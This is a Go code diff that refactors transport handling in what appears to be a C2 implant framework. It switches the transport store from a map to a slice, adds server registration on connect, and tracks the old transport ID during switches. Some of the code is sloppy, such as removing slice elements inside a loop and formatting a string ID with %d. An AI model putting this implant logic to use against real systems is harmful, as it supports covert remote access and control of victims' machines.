@@ -34,7 +34,7 @@ import (
 var (
 	// Transports - All active transports on this implant.
 	Transports = &c2s{
-		Available: map[string]*C2{},
+		Available: []*C2{},
 		mutex:     &sync.RWMutex{},
 		waiter:    &sync.WaitGroup{},
 	}
@@ -43,8 +43,8 @@ var (
 // c2s - Holds all active c2s for this implant.
 // This is consumed by some handlers & listeners, as well as the routing system.
 type c2s struct {
-	Available map[string]*C2 // All transports available (compiled in) to this implant
-	Server    *C2            // The transport tied to the C2 server (active connection)
+	Available []*C2 // All transports available (compiled in) to this implant
+	Server    *C2   // The transport tied to the C2 server (active connection)
 	mutex     *sync.RWMutex
 	waiter    *sync.WaitGroup
 }
@@ -95,11 +95,14 @@ func (t *c2s) Init() (err error) {
 			continue
 		}
 
-		// Else success: set transport as active C2, send registration message and return
+		// Else success: set transport as active C2,
 		t.mutex.RLock()
 		Transports.Server = c2
 		t.mutex.RUnlock()
 
+		// Send the registration message, and break the loop as we successfully connected
+		c2.Register()
+		break
 	}
 
 	return nil
@@ -119,7 +122,7 @@ func (t *c2s) AddFromProfile(profile string) (err error) {
 	if err != nil {
 		return err
 	}
-	t.Available[c2.ID] = c2
+	t.Available = append(t.Available, c2)
 	t.mutex.RUnlock()
 	return nil
 }
@@ -127,15 +130,7 @@ func (t *c2s) AddFromProfile(profile string) (err error) {
 // Add - Add a new active transport to the implant' transport map.
 func (t *c2s) Add(c2 *C2) (err error) {
 	t.mutex.Lock()
-	t.Available[c2.ID] = c2
-	t.mutex.Unlock()
-	return
-}
-
-// Stop - Stop a running C2
-func (t *c2s) Stop(c2 *C2) (err error) {
-	t.mutex.Lock()
-	t.Available[c2.ID] = c2
+	t.Available = append(t.Available, c2)
 	t.mutex.Unlock()
 	return
 }
@@ -143,21 +138,37 @@ func (t *c2s) Stop(c2 *C2) (err error) {
 // Remove - A transport has terminated its connection, and we remove it.
 func (t *c2s) Remove(ID string) (err error) {
 	t.mutex.Lock()
-	delete(t.Available, ID)
+	for i, c2 := range t.Available {
+		if c2.ID == ID {
+			t.Available = append(t.Available[:i], t.Available[i+1:]...)
+		}
+	}
+	// delete(t.Available, ID)
 	t.mutex.Unlock()
 	return
 }
 
 // Get - Returns an active C2 given an ID.
 func (t *c2s) Get(ID string) (c2 *C2) {
-	c2, _ = t.Available[ID]
+	for _, transport := range t.Available {
+		if transport.ID == ID {
+			return transport
+		}
+	}
 	return
 }
 
 // Switch - Dynamically switch the active transport, if multiple are available.
 func (t *c2s) Switch(ID string) (err error) {
 
-	next, found := t.Available[ID]
+	var next *C2
+	var found = false
+	for _, transport := range t.Available {
+		if transport.ID == ID {
+			next = transport
+			found = true
+		}
+	}
 	if !found {
 		return fmt.Errorf("No transport available for ID %d", ID)
 	}
@@ -172,6 +183,10 @@ func (t *c2s) Switch(ID string) (err error) {
 		// {{end}}
 	}
 	// {{end}}
+
+	// Keep the current transport ID, needed when registering
+	// again to the server, for identification purposes.
+	oldTransportID := t.Server.ID
 
 	// Cut the current transport
 	err = t.Server.Stop()
@@ -194,6 +209,7 @@ func (t *c2s) Switch(ID string) (err error) {
 	// Send a confirmation message, because the server is waiting for it.
 	// (by nature the call to switch transports must be asynchronous,
 	// without any error return in the same RPC handler)
+	next.RegisterTransportSwitch(oldTransportID)
 
 	return nil
 }
